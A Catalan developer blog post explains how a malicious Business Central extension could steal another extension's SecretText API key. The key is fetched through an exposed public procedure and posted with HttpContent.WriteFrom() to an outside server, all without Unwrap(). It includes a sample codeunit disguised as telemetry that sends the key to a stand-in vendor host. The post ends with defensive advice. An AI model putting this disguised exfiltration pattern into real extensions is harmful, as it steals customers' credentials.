---
id: secrettext-doesnt-need-to-be-read
title: El teu SecretText no necessita ser llegit per ser robat
description: Com una extensió de tercers de Business Central podria robar les teves credencials sense desempaquetar ni llegir mai el teu `SecretText`.
date: 2026-11-22
author: Guillermo Padilla Martin
---

Acabes de desenvolupar una integració per a Business Central.

Es connecta a una API externa, gestiona l'autenticació i tot funciona a la perfecció.

És clar, necessites un lloc on guardar la teva API key.

I no la desaràs en text pla. Ets un desenvolupador responsable.

Així que fas servir `SecretText`.

T'assegures que les credencials no s'exposin al depurador, evites conversions innecessàries a `Text` i segueixes les recomanacions de Microsoft per gestionar informació sensible.

I hi ha una cosa que et fa sentir especialment bé amb la teva implementació.

**A Business Central SaaS, `SecretText.Unwrap()` no està suportat.**

```al
PlainText := MySecret.Unwrap();
```

Ni parlar-ne.

Encara que un altre fragment de codi obtingui la teva variable `SecretText`, no pot simplement desempaquetar-la i llegir el valor original.

Bé.

Has fet els deures. Les teves credencials estan protegides i pots passar a la tasca següent.

Però hi ha una cosa de la qual crec que hauríem de parlar.

**I si una altra extensió no necessita llegir el teu secret per robar-lo?**

## No necessites Unwrap()

Recordes aquella integració que acabes de desenvolupar?

En algun moment vas necessitar enviar la teva API key al servei extern.

I com que fas servir `SecretText`, probablement vas fer alguna cosa així:

```al
Headers := Client.DefaultRequestHeaders();
Headers.Add(
    'Authorization',
    SecretStrSubstNo('Bearer %1', ApiKey));
```

Res estrany, oi?

Estàs passant la teva API key directament a una capçalera HTTP d'autorització sense convertir-la a `Text` ordinari.

Aquesta és exactament la manera com s'haurien de gestionar les credencials.

Però aquí hi ha una cosa que val la pena pensar.

**Què impedeix que una altra extensió faci servir aquella mateixa credencial per enviar una petició a un servidor completament diferent?**

No `SecretText`.

I la part interessant és que ni tan sols necessita fer servir la credencial per autenticar-se.

Pot simplement enviar el secret sencer com a cos de la petició HTTP.

## Entra en escena una altra extensió

Una de les millors coses de Business Central és la seva extensibilitat.

Un client pot tenir aplicacions de Microsoft, del seu partner d'implementació i de diversos editors de tercers, totes executant-se al mateix entorn.

I, de manera natural, aquestes aplicacions de vegades necessiten interactuar.

Exposem procediments, construïm interfícies i creem funcionalitat que altres extensions poden fer servir.

Res estrany aquí.

Ara imagina que has desenvolupat una integració que s'autentica contra un servei extern.

La teva extensió desa una API key a `IsolatedStorage` amb àmbit de mòdul i la recupera com a `SecretText` quan la necessita.

Fins aquí, tot bé.

Però en algun moment afegeixes un procediment públic per recuperar aquella credencial.

Potser una altra integració la necessita. Potser estava pensat per a ús intern i es va deixar públic per accident.

Sigui quin sigui el motiu, el teu codeunit conté alguna cosa així:

```al
codeunit 50100 "External API Credentials"
{
    procedure GetApiKey() ApiKey: SecretText
    begin
        if not IsolatedStorage.Get(
            'ExternalApiKey',
            DataScope::Module,
            ApiKey)
        then
            Error('API key not configured.');
    end;
}
```

La credencial s'emmagatzema de forma segura.

Es recupera com a `SecretText`.

Mai no es converteix a `Text` ordinari.

Sembla bé, oi?

Excepte que hi ha un problema.

**Aquest procediment és públic.**

Una altra extensió que referenciï la teva pot cridar-lo i rebre la credencial.

El teu emmagatzematge aïllat no s'ha compromès. La teva extensió simplement va recuperar el secret i el va lliurar a una altra extensió.

Ara potser estàs pensant:

*Qui exposaria un procediment que retorna una API key?*

Pregunta justa.

Aquest és un exemple simplificat, i exposar credencials d'aquesta manera és un error de disseny.

Però il·lustra una cosa important: **protegir la representació d'un secret no vol dir que n'hagis protegit l'accés.**

I un cop una altra extensió obté aquell `SecretText`, les coses es posen molt més interessants.

## El teu secret acaba de sortir de Business Central

Imagina que una extensió de tercers té una dependència sobre la teva integració.

Pot cridar `GetApiKey()` i té permís per fer peticions HTTP sortints.

Això és el que podria fer:

```al
codeunit 50200 "Integration Telemetry"
{
    procedure SendTelemetry()
    var
        Credentials: Codeunit "External API Credentials";
        Client: HttpClient;
        Content: HttpContent;
        Response: HttpResponseMessage;
        ApiKey: SecretText;
    begin
        ApiKey := Credentials.GetApiKey();

        Content.WriteFrom(ApiKey);

        Client.Post(
            'https://telemetry.vendor-example.com/api/collect',
            Content,
            Response);
    end;
}
```

Sembla un procediment de telemetria corrent, oi?

Excepte que imagina que l'endpoint pertany a un editor maliciós.

L'extensió no està enviant estadístiques d'ús.

**Està enviant la teva API key.**

Recordes com la teva integració legítima feia servir aquella clau en una capçalera `Authorization`?

Aquesta extensió ni se'n preocupa.

Pren el `SecretText`, l'escriu directament al cos de la petició HTTP amb `HttpContent.WriteFrom()` i l'envia al seu propi servidor.

Sense `Unwrap()`.

Sense conversió a `Text`.

Sense saltar-se les restriccions de Microsoft.

Si la petició té èxit, el servidor receptor obté la credencial original.

**L'extensió mai no va necessitar llegir l'API key. Només necessitava un lloc on enviar-la.**

I aquí hi ha la distinció important.

Instal·lar una extensió de tercers no li dóna automàticament accés a tots els secrets de Business Central.

En el nostre exemple, l'extensió maliciosa va obtenir la credencial perquè la integració original exposava un procediment públic que la retornava.

Sense aquell procediment, o sense una altra via accessible, aquest atac no funcionaria.

**Un emmagatzematge segur no implica automàticament un accés segur.**

## Business Central no bloquejaria la petició?

No necessàriament.

Business Central exigeix que les extensions tinguin habilitat **Allow HttpClient Requests** abans de fer crides HTTP sortints.

Però moltes integracions legítimes necessiten aquest permís, així que habilitar-lo no és inusual.

I aquí hi ha la part important:

**No és una llista de destinacions permeses.**

Un cop habilitat, l'extensió pot intentar comunicar-se amb altres endpoints, no només amb l'API legítima del seu editor.

Així que si una extensió maliciosa obté un `SecretText` i té HTTP sortint habilitat, aquest ajustament de permisos per si sol no impedirà que transmeti la credencial.

## Doncs, SecretText és realment segur?

Absolutament.

I si us plau, no acabis de llegir això pensant que hauries de deixar de fer servir `SecretText`.

Fa exactament el que està dissenyat per fer: protegir valors sensibles de l'exposició a través de la depuració i del tractament ordinari de text, permetent alhora passar-los a les APIs suportades.

Però **protegir un secret de ser llegit no és el mateix que controlar qui el pot fer servir.**

I aquesta és la distinció que vull que els desenvolupadors se n'emportin.

## Què hauríem de fer diferent?

No crec que calgui reinventar com desenvolupem integracions.

Però hi ha tres coses a les quals prestaria més atenció.

**1. Mantén les credencials aïllades.**

Si una API key pertany exclusivament a la teva extensió, considera desar-la a `IsolatedStorage` amb àmbit de mòdul. Recupera-la com a `SecretText` quan la necessitis i evita exposar-la innecessàriament.

**2. Revisa les teves APIs públiques.**

Busca procediments o interfícies que exposin credencials o capacitats sensibles a altres extensions.

Si una altra extensió necessita interactuar amb la teva integració, considera exposar l'operació concreta que necessita en lloc de retornar la credencial subjacent.

**3. Pren't seriosament l'accés HTTP sortint.**

Una extensió amb HTTP sortint habilitat pot comunicar-se amb servidors externs.

Això no la fa maliciosa, però és una capacitat a tenir en compte quan avalues extensions de tercers.

## Conclusions

Curiosament, no ho vaig descobrir investigant vulnerabilitats de seguretat.

Un company havia oblidat una contrasenya desada com a `SecretText`, i jo vaig intentar ajudar-lo a recuperar-la.

És clar, `Unwrap()` no era una opció a Business Central SaaS.

Així que vaig començar a buscar una altra manera d'obtenir el valor original.

Va ser llavors quan em vaig adonar d'una cosa: **en realitat no necessitava llegir la contrasenya dins d'AL. Només necessitava enviar-la a un lloc on la pogués llegir.**

I això em va portar a `HttpContent.WriteFrom()`.

El que va començar com un intent d'ajudar un company a recuperar una contrasenya oblidada em va fer veure que el mateix enfocament podria ser abusat per una extensió amb accés a les credencials d'una altra persona.

`SecretText` fa exactament el que està dissenyat per fer. L'error és assumir que fa més.

Perquè **el teu `SecretText` no necessita ser llegit per ser robat.**

---

### Referències

- [Microsoft Learn: Protecting sensitive values with SecretText](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-secret-text)
- [Microsoft Learn: SecretText.Unwrap()](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/secrettext/secrettext-unwrap-method)
- [Microsoft Learn: HttpHeaders.Add(Text, SecretText)](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpheaders/httpheaders-add-string-secrettext-method)
- [Microsoft Learn: HttpContent.WriteFrom(SecretText)](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpcontent/httpcontent-writefrom-secrettext-method)
- [Microsoft Learn: Isolated Storage](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/devenv-isolated-storage)
- [Microsoft Learn: HttpClient.Post()](https://learn.microsoft.com/en-us/dynamics365/business-central/dev-itpro/developer/methods-auto/httpclient/httpclient-post-method)
